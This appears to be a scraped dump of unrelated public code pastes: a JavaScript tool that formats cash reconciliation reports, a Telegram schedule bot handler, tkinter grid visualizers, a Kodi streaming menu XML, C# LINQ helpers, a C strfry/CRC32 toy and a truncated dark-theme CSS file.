            showMessage('sampleLoaded', 'success');
        }

        // Clear input function
        function clearInput() {
            document.getElementById('inputText').value = '';
            showMessage('inputCleared', 'info');
        }

        // Reset output function
        function resetOutput() {
            document.getElementById('output').innerHTML = '';
            document.getElementById('scaledOutput').innerHTML = '';
            showMessage('outputReset', 'info');
        }

        // Reset all function
        function resetAll() {
            document.getElementById('inputText').value = '';
            document.getElementById('output').innerHTML = '';
            document.getElementById('scaledOutput').innerHTML = '';
            showMessage('allReset', 'info');
        }

        // Copy output function
        function copyOutput() {
            const outputElement = document.getElementById('output');
            if (!outputElement.textContent.trim()) {
                showMessage('nothingToCopy', 'error');
                return;
            }
            
            const plainOutput = outputElement.textContent;
            navigator.clipboard.writeText(plainOutput)
                .then(() => {
                    showMessage('copySuccess', 'success');
                })
                .catch(() => {
                    showMessage('copyError', 'error');
                });
        }

        // Show in new window function
        function showInNewWindow() {
            const outputElement = document.getElementById('output');
            if (!outputElement.textContent.trim()) {
                showMessage('nothingToShow', 'error');
                return;
            }
            
            const plainOutput = outputElement.textContent;
            const newWindow = window.open('');
            const title = translations[currentLang].outputLabel;
            newWindow.document.write(`
                <!DOCTYPE html>
                <html lang=""${currentLang}"">
                <head>
                    <meta charset=""UTF-8"">
                    <title>${title}</title>
                    <style>
                        body { 
                            font-family: 'Courier New', Courier, monospace; 
                            white-space: pre; 
                            padding: 20px;
                            background-color: #f5f5f5;
                        }
                        pre {
                            background: white;
                            padding: 20px;
                            border-radius: 4px;
                            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                        }
                    </style>
                </head>
                <body>
                    <pre>${plainOutput}</pre>
                </body>
                </html>
            `);
            newWindow.document.close();
        }

        // Date extraction from header
        function extractDateFromHeader(headerLines) {
            const beginnLine = headerLines.find(line => line.trim().startsWith('POSECKSA BEGINN:'));
            if (beginnLine) {
                const dateMatch = beginnLine.match(/(\d{4})(\d{2})(\d{2})/);
                if (dateMatch) {
                    const [, year, month, day] = dateMatch;
                    return `${day}.${month}.${year}`;
                }
            }
            return '';
        }

        // Get current date
        function getCurrentDate() {
            const today = new Date();
            const day = String(today.getDate()).padStart(2, '0');
            const month = String(today.getMonth() + 1).padStart(2, '0');
            const year = today.getFullYear();
            return `${day}.${month}.${year}`;
        }

        // Get column widths
        function getColumnWidths(headerLine) {
            const columns = headerLine.split('|').slice(1, -1);
            return columns.map(col => col.length);
        }

        // Normalize table row
        function normalizeRow(row, columnWidths) {
            const columns = row.split('|').slice(1, -1);
            const normalized = columns.map((col, i) => {
                const width = columnWidths[i] || col.length;
                return col.padEnd(width, ' ');
            });
            return `|${normalized.join('|')}|`;
        }

        // Main text processing function
        function processText() {
            const input = document.getElementById('inputText').value.trim();
            if (!input) {
                showMessage('noInput', 'error');
                return;
            }

            try {
                const useCurrentDate = document.getElementById('useCurrentDate').checked;
                const lines = input.split('\n').filter(line => line.trim());
                const processedLines = [];
                let headerLines = [];
                let dataLines = [];
                let footerLines = [];
                let columnWidths = [];
                let endeLine = null;

                // Split into header, data and footer sections
                let isHeader = true;
                let isData = false;
                let headerLineFound = false;
                
                for (const line of lines) {
                    if (line.trim().startsWith('|')) {
                        isHeader = false;
                        isData = true;
                        dataLines.push(line);
                        if (!headerLineFound && line.includes('OBN')) {
                            columnWidths = getColumnWidths(line);
                            headerLineFound = true;
                        }
                    } else if (isHeader) {
                        headerLines.push(line);
                    } else if (isData) {
                        if (line.trim().startsWith('regards')) {
                            isData = false;
                        } else if (line.trim().startsWith('POSECKSA ENDE:')) {
                            endeLine = line;
                        } else if (!line.trim().startsWith('regards')) {
                            footerLines.push(line);
                        }
                    }
                }

                // Add text with date
                let extractedDate = extractDateFromHeader(headerLines);
                if (!extractedDate && useCurrentDate) {
                    extractedDate = getCurrentDate();
                }
                const dateText = extractedDate || 'N/A';
                processedLines.push(`Hi all,\n\nattached the Kassenschnitte/Reconciliation from ${dateText}.\n`);

                // Add header to output
                headerLines.forEach(line => processedLines.push(line));
                if (headerLines.length > 0) {
                    processedLines.push('');
                }

                // Add header and separator line once
                const headerLine = dataLines.find(line => line.includes('OBN'));
                const separatorLine = dataLines.find(line => line.includes('----------'));
                if (headerLine) processedLines.push(normalizeRow(headerLine, columnWidths));
                if (separatorLine) processedLines.push(normalizeRow(separatorLine, columnWidths));

                // Analyze data rows
                const lineObjects = dataLines
                    .filter(line => !line.includes('----------') && !line.includes('OBN'))
                    .map((line, index) => {
                        const normalizedLine = normalizeRow(line, columnWidths);
                        const firstFieldMatch = line.match(/^\|([^|]*)\|/);
                        const firstField = firstFieldMatch ? firstFieldMatch[1].trim() : '';
                        const isVIP = VIP_SITES.includes(firstField.replace(/^0+/, ''));

                        let priority = 5;
                        for (const [keyword, group] of Object.entries(PRIORITY_GROUPS)) {
                            if (line.toLowerCase().includes(keyword)) {
                                priority = group;
                                break;
                            }
                        }

                        if (priority === 4 && isVIP) {
                            priority = 5;
                        }

                        return {
                            Line: normalizedLine,
                            Index: index,
                            PriorityGroup: priority,
                            VIPsite: isVIP,
                            FirstField: firstField
                        };
                    });

                // Sort and group
                const sortedLines = lineObjects.sort((a, b) => 
                    a.PriorityGroup - b.PriorityGroup || a.Index - b.Index
                );

                // Process groups
                const numberCount = {};
                sortedLines.forEach(obj => {
                    const firstField = obj.FirstField;
                    numberCount[firstField] = (numberCount[firstField] || 0) + 1;
                });

                let currentPriority = -1;
                sortedLines.forEach(obj => {
                    if (obj.PriorityGroup !== currentPriority) {
                        if (currentPriority !== -1) {
                            const desc = GROUP_DESCRIPTIONS[currentPriority] || '';
                            if (desc) {
                                processedLines.push(`<strong>${desc.padEnd(columnWidths[0] || 10, ' ')}</strong>`);
                            } else {
                                processedLines.push('');
                            }
                        }
                        currentPriority = obj.PriorityGroup;
                    }

                    processedLines.push(obj.Line);

                    // Spracovanie skupiny 5
                    if (obj.PriorityGroup === 5) {
                        const firstField = obj.FirstField;
                        if (numberCount[firstField] === 1 && obj.VIPsite) {
                            const warning = 'WARNING - Airport or LNG Stand Alone - Create ticket';
                            processedLines.push(`<span class=""warning"">${warning.padEnd(columnWidths[0] || 10, ' ')}</span>`);
                        }
                        if (numberCount[firstField] === 1) {
                            processedLines.push('');
                        }
                        if (numberCount[firstField] > 0) {
                            numberCount[firstField]--;
                        }
                    }
                });

                // Pridať posledný popis
                if (currentPriority !== -1) {
                    const desc = GROUP_DESCRIPTIONS[currentPriority] || '';
                    if (desc) {
                        processedLines.push(`<strong>${desc.padEnd(columnWidths[0] || 10, ' ')}</strong>`);
                    } else {
                        processedLines.push('');
                    }
                }

                // Pridať pätu
                if (footerLines.length > 0) {
                    processedLines.push('');
                    footerLines.forEach(line => processedLines.push(line));
                }
                if (endeLine) {
                    processedLines.push(endeLine);
                }

                // Finalizácia
                const output = processedLines.join('\n');
                document.getElementById('output').innerHTML = output.replace(/\n/g, '<br>');
                document.getElementById('scaledOutput').innerHTML = output.replace(/\n/g, '<br>');

                showMessage('Text bol úspešne spracovaný', 'success');

            } catch (error) {
                showMessage('Chyba pri spracovaní textu: ' + error.message, 'error');
            }
        }

        // Klávesové skratky
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey || e.metaKey) {
                switch(e.key) {
                    case 'Enter':
                        e.preventDefault();
                        processText();
                        break;
                    case 'c':
                        if (e.shiftKey) {
                            e.preventDefault();
                            copyOutput();
                        }
                        break;
                }
            }
        });
    </script>
</body>
</html>"
w69u7s8Z,Untitled,RenSafaray,Python,Saturday 14th of June 2025 02:08:14 PM CDT,"@router.message(Command(""schedule""))
async def handle_schedule_command(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    student = Students.get_or_none(Students.id_tg == user_id)

    if not student:
        await message.answer(""Сначала выбери роль: преподаватель или студент."")
        await state.set_state(Form.waiting_for_role)
        return

    teacher = Teachers.get_or_none(Teachers.user_id == student.id)
    is_teacher = teacher is not None

    if is_teacher:
        await message.answer(""Ваша роль: преподаватель"")  # <- добавлено сообщение

        # Преподаватель — покажем все его группы из Schedule
        schedules = Schedule.select().where(Schedule.user_id == student.id)
        unique_groups = {schedule.group_id.id: schedule.group_id for schedule in schedules}

        if not unique_groups:
            await message.answer(""У вас пока нет добавленных групп. Используйте /noti для добавления."")
            return

        if len(unique_groups) == 1:
            group = list(unique_groups.values())[0]
            today = datetime.now().date()
            await show_schedule_navigation(message, today, group, is_teacher=True)
        else:
            from aiogram.utils.keyboard import InlineKeyboardBuilder
            builder = InlineKeyboardBuilder()
            for group in unique_groups.values():
                builder.button(
                    text=group.name,
                    callback_data=f""teacher_schedule:{group.id}""
                )
            builder.adjust(2)
            await message.answer(""Выберите группу для просмотра расписания:"", reply_markup=builder.as_markup())
            await state.set_state(Form.teacher_waiting_group)

    else:
        await message.answer(""Ваша роль: студент"")
        if student.group_id:
            group = Groups.get_by_id(student.group_id)
            today = datetime.now().date()
            await show_schedule_navigation(message, today, group, is_teacher=False)
        else:
            await message.answer(""Введите название вашей группы:"")
            await state.set_state(Form.waiting_for_group)"
X9NQDyZW,# tk_create_rotated_text.py,here2share,Python,Saturday 14th of June 2025 02:01:01 PM CDT,"# tk_create_rotated_text.py

import math
import tkinter as tk
from tkinter import Canvas
import time
from PIL import Image, ImageDraw, ImageFont, ImageTk

ww = 640
hh = 640
root = tk.Tk()
root.title(""list_zoom.py"")
root.geometry(f""{ww}x{hh}+0+0"")
cell_size = 40
font_size = 10
n = 10
grid_size = 20 * cell_size
squares = {}
cell_order = []
visited = set()
drag_start_x = 0
drag_start_y = 0
canvas = tk.Canvas(root, width=ww, height=hh, bg=""white"")
canvas.pack(fill=tk.BOTH, expand=True)

def create_rotated_text(text, angle, font_size=10):
	try:
		temp_img = Image.new('RGBA', (200, 200), (255, 255, 255, 0))
		temp_draw = ImageDraw.Draw(temp_img)
		
		try:
			font = ImageFont.truetype(""arial.ttf"", font_size)
		except:
			try:
				font = ImageFont.load_default()
			except:
				font = None
		
		if font:
			bbox = temp_draw.textbbox((0, 0), text, font=font)
			text_width = bbox[2] - bbox[0]
			text_height = bbox[3] - bbox[1]
		else:
			text_width = len(text) * font_size // 2
			text_height = font_size
		
		img_size = max(text_width, text_height) + 20
		img = Image.new('RGBA', (img_size, img_size), (255, 255, 255, 0))
		draw = ImageDraw.Draw(img)
		
		text_x = (img_size - text_width) // 2
		text_y = (img_size - text_height) // 2
		
		if font:
			draw.text((text_x, text_y), text, font=font, fill='black')
		else:
			draw.text((text_x, text_y), text, fill='black')
		
		rotated_img = img.rotate(angle, expand=True)
		
		return ImageTk.PhotoImage(rotated_img)
	except Exception as e:
		print(f""Error creating rotated text: {e}"")
		return None

# Create grid cells
for x in range(-n, n):
    for y in range(-n, n):
        canvas_x = (x + n) * cell_size
        canvas_y = (-y + n - 1) * cell_size
        rect_id = canvas.create_rectangle(
            canvas_x,
            canvas_y,
            canvas_x + cell_size,
            canvas_y + cell_size,
            outline=""black"",
            fill=""white"",
            tag=""cells"",
        )
        squares[(x, y)] = rect_id
        
        # Create rotated text
        text_x = canvas_x + cell_size // 2
        text_y = canvas_y + cell_size // 2
        
        rotated_text_img = create_rotated_text(f""{x},{y}"", 45, 12)
        
        if rotated_text_img:
            canvas.create_image(
                text_x,
                text_y,
                image=rotated_text_img,
                anchor='center'
            )
            if not hasattr(canvas, 'text_images'):
                canvas.text_images = []
            canvas.text_images.append(rotated_text_img)
        else:
            canvas.create_text(
                text_x,
                text_y,
                text=f""{x},{y}"",
                font=(""Arial"", 12),
                fill=""black"",
            )

span = int((n ** 2 + n ** 2) ** 0.5) + 1
for angle_deg in range(90):
    angle_rad = math.radians(angle_deg)
    cos_val = math.cos(angle_rad)
    sin_val = math.sin(angle_rad)
    for r in range(span):
        x = int(r * cos_val)
        y = int(r * sin_val)
        if (x, y) in visited:
            continue
        
        quadrants = [
            (x, y),
            (-y-1, x),
            (-x-1, -y-1),
            (y, -x-1)
        ]
        
        for qx, qy in quadrants:
            cell_order.append((qx, qy))
            visited.add((qx, qy))

grid_colors = {
    (0, 0): (255, 255, 255),
    (0, 1): (255, 255, 0),
    (0, 2): (0, 255, 0),
    (1, 0): (255, 165, 0),
    (1, 1): (128, 128, 128),
    (1, 2): (0, 0, 255),
    (2, 0): (255, 0, 0),
    (2, 1): (128, 0, 128),
    (2, 2): (0, 0, 0)
}

def interpolate_color(x, y):
    norm_x = (x + n) / (2 * n) * 2
    norm_y = (y + n) / (2 * n) * 2
    x0 = int(norm_x)
    x1 = min(x0 + 1, 2)
    y0 = int(norm_y)
    y1 = min(y0 + 1, 2)
    c00 = grid_colors.get((x0, y0), (255, 255, 255))
    c10 = grid_colors.get((x1, y0), (255, 255, 255))
    c01 = grid_colors.get((x0, y1), (255, 255, 255))
    c11 = grid_colors.get((x1, y1), (255, 255, 255))
    dx = norm_x - x0
    dy = norm_y - y0
    top = [c00[i] * (1 - dx) + c10[i] * dx for i in range(3)]
    bottom = [c01[i] * (1 - dx) + c11[i] * dx for i in range(3)]
    color = [top[i] * (1 - dy) + bottom[i] * dy for i in range(3)]
    return f'#{int(color[0]):02x}{int(color[1]):02x}{int(color[2]):02x}'

def detect_color(x, y):
    return None

def start_drag(event):
    global drag_start_x, drag_start_y
    drag_start_x = event.x
    drag_start_y = event.y
    canvas.config(cursor=""fleur"")

def drag_canvas(event):
    global drag_start_x, drag_start_y
    dx = event.x - drag_start_x
    dy = event.y - drag_start_y
    canvas.move(""all"", dx, dy)
    drag_start_x = event.x
    drag_start_y = event.y

def stop_drag(event):
    canvas.config(cursor="""")

interpolated_colors = {}
for x in range(-n, n):
    for y in range(-n, n):
        interpolated_colors[(x, y)] = interpolate_color(x, y)
		
for x, y in cell_order:
	if (x, y) in squares:
		canvas.itemconfig(squares[(x, y)], fill=interpolated_colors[(x, y)])
		if detect_color(x, y):
			canvas.itemconfig(squares[(x, y)], fill=""red"")
		canvas.update()

canvas.bind(""<Button-1>"", start_drag)
canvas.bind(""<B1-Motion>"", drag_canvas)
canvas.bind(""<ButtonRelease-1>"", stop_drag)
root.mainloop()"
L7PM7vCU,ar,Mitsubishi-Space,XML,Saturday 14th of June 2025 01:56:02 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
<items>

<item>
<title>Live TV</title>
<link>https://www.tvaddons.ag/forums/ignorme</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/TVmalaysia.xml</externallink>
<thumbnail>https://raw.githubusercontent.com/AbeKodi/icons/master/Live%20TV.png</thumbnail>
<info>Siaran Live TV daripada Malaysia dan juga luar negara</info>
</item>

<item>
<title>Sport Republica</title>
<link>https://androidrepublica.com/ignore</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/Sport.xml</externallink>
<thumbnail>https://raw.githubusercontent.com/androidrepublica/icons/master/Sport%20Republica.png</thumbnail>
<info>Siaran Sukan daripada Malaysia dan juga luar negara</info>
</item>

<item>
<title>Siaran Radio</title>
<link>https://androidrepublica.com/ignore</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/RadioMalaysia.xml</externallink>
<thumbnail>https://raw.githubusercontent.com/AbeKodi/icons/master/Radio.png</thumbnail>
<info>Siaran radio tempatan </info>
</item>

<item>
<title>Filem</title>
<link>https://androidrepublica.com/ignore</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/free/FilemMalayaAR.xml</externallink>
<thumbnail>https://raw.githubusercontent.com/AbeKodi/icons/master/Filem.png</thumbnail>
<info>Koleksi movie terkini daripada Malaysia</info>
</item>

<item>
<title>Drama</title>
<link>https://androidrepublica.com/ignore</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/DramaMelaya.xml</externallink>
<thumbnail>https://raw.githubusercontent.com/AbeKodi/icons/master/Drama.png</thumbnail>
<info>Koleksi Drama terkini daripada Malaysia</info>
</item>

<item>
<title>Telemovie</title>
<link>https://androidrepublica.com/ignore</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/free/TelemovieAR.xml</externallink>
<thumbnail>https://raw.githubusercontent.com/AbeKodi/icons/master/TELEMOVIE.png</thumbnail>
<info>Koleksi Telemovie terkini daripada Malaysia</info>
</item>  

<item>
<title>TV Show</title>
<link>https://androidrepublica.com/ignore</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/TVShow.xml</externallink>
<thumbnail>https://raw.githubusercontent.com/AbeKodi/icons/master/TVShow.png</thumbnail>
<info>Koleksi TV Show terkini daripada Malaysia</info>
</item>

<item>
<title>Klasik</title>
<link>https://androidrepublica.com/ignore</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/Klasik.xml</externallink>
<thumbnail>https://raw.githubusercontent.com/AbeKodi/icons/master/RETRO.png</thumbnail>
<info>Koleksi filem klasik daripada Malaysia</info>
</item> 

<item>
<title>Animasi Tempatan</title>
<link>https://androidrepublica.com/ignore</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/Animasi.xml</externallink>
<thumbnail>https://raw.githubusercontent.com/AbeKodi/icons/master/ANIMASI.png</thumbnail>
<info>Koleksi annimasi terkini daripada Malaysia</info>
</item>

<item>
<title>English HD Movie</title>
<link>https://androidrepublica.com/ignore</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/EnglishAR.xml</externallink>
<thumbnail>https://raw.githubusercontent.com/AbeKodi/icons/master/eNGLISH.png</thumbnail>
<info>Require URL Resolver. Please install latest URL Resolver script</info>
</item>
  
<item>
<title>Indonesia Movie</title>
<link>https://raw.githubusercontent.com/androidrepublica/playlist/master/Seonly1.mp4</link>
<thumbnail>https://raw.githubusercontent.com/AbeKodi/icons/master/INDONESIA.png</thumbnail>
<info>Koleksi movie terkini daripada Indonesia</info>
</item>

<item>
<title>Thailand Movie</title>
<link>https://raw.githubusercontent.com/androidrepublica/playlist/master/Seonly1.mp4</link>
<thumbnail>https://raw.githubusercontent.com/androidrepublica/icons/master/thai.png</thumbnail>
<info>Koleksi movie dan drama terkini daripada Thailand</info>
</item>

<item>
<title>Documentary</title>
<link>https://androidrepublica.com/ignore</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/Documentary.xml</externallink>
<thumbnail>https://raw.githubusercontent.com/androidrepublica/icons/master/documentary.png</thumbnail>
<info>Documentary for Learning and educational</info>
</item>

<item>
<title>Zon Kuliah</title>
<link>https://androidrepublica.com/ignore</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/Zon%20Kuliah.xml</externallink>
<thumbnail>https://raw.githubusercontent.com/AbeKodi/icons/master/ZON%20AGAMA.png</thumbnail>
<info>Live Streaming, Media, Short Video, Islamic Daily Reminder, Motivational Quotes, etc</info>
</item>

<item>
<title>Karaoke Nightz (New)</title>
<link>https://www.tvaddons.ag/forums/ignorme</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/Karaoke_Melayu.xml</externallink>
<thumbnail>https://raw.githubusercontent.com/AbeKodi/icons/master/KARAOKE.png</thumbnail>
<info>Segment karok lagu dalam dan luar negara</info>
</item>

<item>
<title>Konsert Live | Rock Kapak (New)</title>
<link>https://www.tvaddons.ag/forums/ignorme</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/konsert.xml</externallink>
<thumbnail>https://raw.githubusercontent.com/androidrepublica/icons/master/konsert.png</thumbnail>
<info>Konsert LIve Rock Kapak</info>
</item>

<item>
<title>Dapur Masakan</title>
<thumbnail>https://raw.githubusercontent.com/AbeKodi/icons/master/dapur.png</thumbnail>
<link>https://androidrepublica.com/ignore</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/Dapur.xml</externallink>
<thumbnail>https://raw.githubusercontent.com/AbeKodi/icons/master/dapur.png</thumbnail>
<info>Bosan dengan masakan yang gitu - gitu saja? Kami ada Menu Masakan Alternatif untuk hidangan keluarga di rumah.</info>
</item>

<item>
<title>Information Centre</title>
<link>https://android.com/ignore</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/InformasiSE.xml</externallink>
<info>Segala informasi dan juga update terkini daripada androidrepublica.com</info>
</item>

<item>
<title>Maintenance Tool</title>
<link>https://android/ignore</link>
<externallink>https://raw.githubusercontent.com/androidrepublica/kokdiang/main/Maintenance.xml</externallink>
<thumbnail>https://raw.githubusercontent.com/androidrepublica/icons/master/MAINTENANCE.png</thumbnail>
<info>Maintenance Tool for Your Kodi</info>
</item>

</items>"
czsmt20N,Pillole video 17,fcamuso,C#,Saturday 14th of June 2025 01:11:58 PM CDT,"public static class EnumerableExtensions
{
    // da usare con 'foreeach' per ottenrere l'indice
    public static IEnumerable<(T, int)> WithIndex<T>(this IEnumerable<T> items, 
				                                               int skip = 0, bool useSkipped = true)
    {
        if (skip < 0) throw new ArgumentOutOfRangeException(nameof(skip), ""value not valid"");
        return items.Select((value, index) => (value, useSkipped ? index : index - skip)).Skip(skip);
    }

    // foreach direttamente sull'enumeratore (es: items.ForEach(...))
    public static void ForEachWithIndex<T>(this IEnumerable<T> items, 
				                                     Action<T, int> action, int skip = 0, bool useSkipped = false)
    {
        foreach (var (value, index) in items.WithIndex(skip, useSkipped)) action.Invoke(value, index);
    }


    // applica where solo se si soddisfa la condizione
    public static IEnumerable<T> WhereIf<T>(this IEnumerable<T> items, Func<T, bool> predicate, bool condition = true)
    {
        return condition ? items.Where(predicate) : items;
    }

    
    // Ottiene il conteggio oppure 0 se null
    public static int CountOrDefault<T>(this IEnumerable<T>? items, Func<T, bool>? predicate = null)
    {
        return predicate == null ?
            items?.Count() ?? 0 :
            items?.Count(predicate) ?? 0;
    }

    // Concatena stringhe
    public static string JoinString(this IEnumerable<string> items, string separator)
        => string.Join(separator, items);

    // ForEach Async
    public static async Task ForEachAsync<T>(this IEnumerable<T> enumerable, 
				                                       Func<T, Task> action, CancellationToken token = default)
    {
        foreach (var item in enumerable)
        {
            token.ThrowIfCancellationRequested();
            await action.Invoke(item).ConfigureAwait(false);
        }
    }
}"
fzbtmZEz,# tk_Gradient_Radial_Scan_Visualizer.py,here2share,Python,Saturday 14th of June 2025 01:08:09 PM CDT,"# tk_Gradient_Radial_Scan_Visualizer.py

import math
import tkinter as tk
from tkinter import Canvas
import time

ww = 640
hh = 640

root = tk.Tk()
root.title(""Gradient Radial Scan Visualizer"")
root.geometry(f""{ww}x{hh}+0+0"")

cell_size = 40
font_size = 10
n = 10
grid_size = 20 * cell_size
squares = {}
cell_order = []
visited = set()

drag_start_x = 0
drag_start_y = 0

canvas = tk.Canvas(root, width=ww, height=hh, bg=""white"")
canvas.pack(fill=tk.BOTH, expand=True)

for x in range(-n, n):
    for y in range(-n, n):
        canvas_x = (x + n) * cell_size
        canvas_y = (-y + n - 1) * cell_size
        rect_id = canvas.create_rectangle(
            canvas_x,
            canvas_y,
            canvas_x + cell_size,
            canvas_y + cell_size,
            outline=""black"",
            fill=""white"",
            tag=""cells"",
        )
        squares[(x, y)] = rect_id
        text_x = canvas_x + cell_size // 2
        text_y = canvas_y + cell_size // 2
        canvas.create_text(
            text_x,
            text_y,
            text=f""{x},{y}"",
            font=(""Arial"", font_size),
            fill=""black"",
        )

for angle_deg in range(90):
    angle_rad = math.radians(angle_deg)
    cos_val = math.cos(angle_rad)
    sin_val = math.sin(angle_rad)
    for r in range(n + 1):
        x = int(r * cos_val)
        y = int(r * sin_val)
        if (x, y) in visited:
            continue
        
        quadrants = [
            (x, y),
            (-y-1, x),
            (-x-1, -y-1),
            (y, -x-1)
        ]
        
        for qx, qy in quadrants:
            cell_order.append((qx, qy))
            visited.add((qx, qy))

grid_colors = {
    (0, 0): (255, 255, 255),
    (0, 1): (255, 255, 0),
    (0, 2): (0, 255, 0),
    (1, 0): (255, 165, 0),
    (1, 1): (128, 128, 128),
    (1, 2): (0, 0, 255),
    (2, 0): (255, 0, 0),
    (2, 1): (128, 0, 128),
    (2, 2): (0, 0, 0)
}

def interpolate_color(x, y):
    norm_x = (x + n) / (2 * n) * 2
    norm_y = (y + n) / (2 * n) * 2
    x0 = int(norm_x)
    x1 = min(x0 + 1, 2)
    y0 = int(norm_y)
    y1 = min(y0 + 1, 2)
    c00 = grid_colors.get((x0, y0), (255, 255, 255))
    c10 = grid_colors.get((x1, y0), (255, 255, 255))
    c01 = grid_colors.get((x0, y1), (255, 255, 255))
    c11 = grid_colors.get((x1, y1), (255, 255, 255))
    dx = norm_x - x0
    dy = norm_y - y0
    top = [c00[i] * (1 - dx) + c10[i] * dx for i in range(3)]
    bottom = [c01[i] * (1 - dx) + c11[i] * dx for i in range(3)]
    color = [top[i] * (1 - dy) + bottom[i] * dy for i in range(3)]
    return f'#{int(color[0]):02x}{int(color[1]):02x}{int(color[2]):02x}'

interpolated_colors = {}
for x in range(-n, n):
    for y in range(-n, n):
        interpolated_colors[(x, y)] = interpolate_color(x, y)

def detect_color(x, y):
    return None

def process_pixels():
    for x, y in cell_order:
        if (x, y) in squares:
            canvas.itemconfig(squares[(x, y)], fill=interpolated_colors[(x, y)])
            time.sleep(0.01)
            if detect_color(x, y):
                canvas.itemconfig(squares[(x, y)], fill=""red"")
            canvas.update()

def start_drag(event):
    global drag_start_x, drag_start_y
    drag_start_x = event.x
    drag_start_y = event.y
    canvas.config(cursor=""fleur"")

def drag_canvas(event):
    global drag_start_x, drag_start_y
    dx = event.x - drag_start_x
    dy = event.y - drag_start_y
    canvas.move(""all"", dx, dy)
    drag_start_x = event.x
    drag_start_y = event.y

def stop_drag(event):
    canvas.config(cursor="""")

canvas.bind(""<Button-1>"", start_drag)
canvas.bind(""<B1-Motion>"", drag_canvas)
canvas.bind(""<ButtonRelease-1>"", stop_drag)

while True:
    process_pixels()
    canvas.itemconfig(""cells"", fill=""white"")

root.mainloop()"
QqYK10ux,strfry,teknoraver,C,Saturday 14th of June 2025 01:03:52 PM CDT,"#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdint.h>

uint32_t crc32(const char *data)
{
        uint32_t crc = 0xFFFFFFFF;
        while (*data) {
                crc ^= (uint8_t) (*data);
                for (int i = 0; i < 8; i++) {
                        if (crc & 1)
                                crc = (crc >> 1) ^ 0xEDB88320;
                        else
                                crc >>= 1;
                }
                data++;
        }
        return ~crc;
}

int main(void)
{
        char s[] = ""codroipo "";

        while (crc32(s) != 0x774a59e3 && crc32(s) != 0xc4fb9a5) {
                strfry(s);
                puts(s);
        }

        return 0;
}"
bfAJGJix,pf-css,globiws,CSS,Saturday 14th of June 2025 11:12:48 AM CDT,"/* Core module CSS variable definitions */
:root {
    --fore-color: #fdfdfd;
    --hint-fore-color: #888;
    --secondary-fore-color: #f0f0f0;
    --back-color: #111;
    --secondary-back-color: #222;
    --blockquote-color: #f57c00;
    --pre-color: #1565c0;
    --border-color: #ddd;
    --secondary-border-color: #aaa;
    --heading-ratio: 1.19;
    --universal-margin: 0.5rem;
    --universal-padding: 0.5rem;
    --universal-border-radius: 0.125rem;
    --a-link-color: #5093c7;
    --a-visited-color: #5093c7;
}

/* Table module CSS variable definitions. */
:root {
    --table-border-color: #999;
    --table-border-separator-color: #666;
    --table-head-back-color: #212121;
    --table-head-fore-color: #fdfdfd;
    --table-body-back-color: #111;
    --table-body-fore-color: #fdfdfd;
    --table-body-alt-back-color: #444;
    --table-body-alt-fore-color: #eee;
    --table-body-hover-back-color: #5c819f;
    --table-cell-padding: 1rem;
}

/* Card component CSS variable definitions */
:root {
    --card-back-color: #111;
    --card-fore-color: #fdfdfd;
    --card-border-color: #aaa;
}

/* Input_control module CSS variable definitions */
:root {
    --form-back-color: #111;
    --form-alt-back-color: #333;
    --form-fore-color: #fdfdfd;
    --form-border-color: #222;
    --form-row-border-color: #333;
    --form-error-back-color: #611;
    --form-error-border-color: #500;
    --input-back-color: #111;
    --input-fore-color: #fdfdfd;
    --input-alt-fore-color: #ddd;
    --input-border-color: #aaa;
    --input-focus-color: #0288d1;
    --input-invalid-color: #d32f2f;
    --input-locked-back-color: #111;
    --input-locked-fore-color: #fdfdfd;
    --button-back-color: #212121;
    --button-hover-back-color: #444;
    --button-fore-color: #e2e2e2;
    --button-border-color: transparent;
    --button-hover-border-color: transparent;
    --button-group-border-color: rgba(124, 124, 124, 0.54);
}

/* Navigation module CSS variable definitions */
:root {
    --header-back-color: #111;
    --header-hover-back-color: #222;
    --header-fore-color: #f0f0f0;
    --header-border-color: #aaa;
    --nav-back-color: #111;
    --nav-hover-back-color: #222;
    --nav-fore-color: #f0f0f0;
    --nav-border-color: #aaa;
    --nav-link-color: #0277bd;
    --footer-fore-color: #f0f0f0;
    --footer-back-color: #111;
    --footer-border-color: #aaa;
    --footer-link-color: #0277bd;
    --drawer-back-color: #111;
    --drawer-hover-back-color: #222;
    --drawer-border-color: #aaa;
    --drawer-close-color: #f0f0f0;
}

/* Contextual module CSS variable definitions */
:root {
    --mark-back-color: #0277bd;
    --mark-fore-color: #fafafa;
}
:root {
    --toast-back-color: #424242;
    --toast-fore-color: #fafafa;
}
:root {
    --tooltip-back-color: #fafafa;
    --tooltip-fore-color: #212121;
}
:root {
    --modal-overlay-color: rgba(0, 0, 0, 0.45);
    --modal-close-color: #f0f0f0;
    --modal-close-hover-color: #222;
}

/* Progess module CSS variable definitions */
:root {
    --progress-back-color: #aaa;
    --progress-fore-color: #555;
}

/* Utility module CSS variable definitions */
:root {
    --generic-border-color: rgba(0, 0, 0, 0.3);
    --generic-box-shadow: 0 0.25rem 0.25rem 0 rgba(0, 0, 0, 0.125), 0 0.125rem 0.125rem -0.125rem rgba(0, 0, 0, 0.125);
}
:root {
    --collapse-label-back-color: #111;
    --collapse-label-fore-color: #fafafa;
    --collapse-label-hover-back-color: #222;
    --collapse-selected-label-back-color: #444;
    --collapse-border-color: #aaa;
